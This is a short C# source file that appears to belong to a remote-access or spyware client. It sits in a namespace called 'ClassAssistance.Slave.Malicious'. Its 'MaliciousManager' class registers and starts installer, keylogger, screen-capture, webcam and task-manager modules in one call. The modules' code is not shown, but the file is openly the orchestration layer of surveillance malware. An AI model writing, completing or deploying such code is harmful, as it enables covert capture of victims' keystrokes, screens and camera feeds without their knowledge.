using System.Collections.Generic;
using ClassAssistance.Common;

namespace ClassAssistance.Slave.Malicious
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class MaliciousManager : Singleton<MaliciousManager>
    {
        /// <summary>
        /// 
        /// </summary>
        private readonly List<IMalicious> m_malicious;

        /// <summary>
        /// 
        /// </summary>
        public MaliciousManager()
        {
            m_malicious = new List<IMalicious>
            {
                Installer.Instance,
                Keylogger.Instance,
                ScreenCapture.Instance,
                Webcam.Instance,
                TaskManager.Instance
            };
        }

        /// <summary>
        /// 
        /// </summary>
        public void Initialize()
        {
            m_malicious.ForEach(malicious => malicious.Initialize());
        }
    }
}
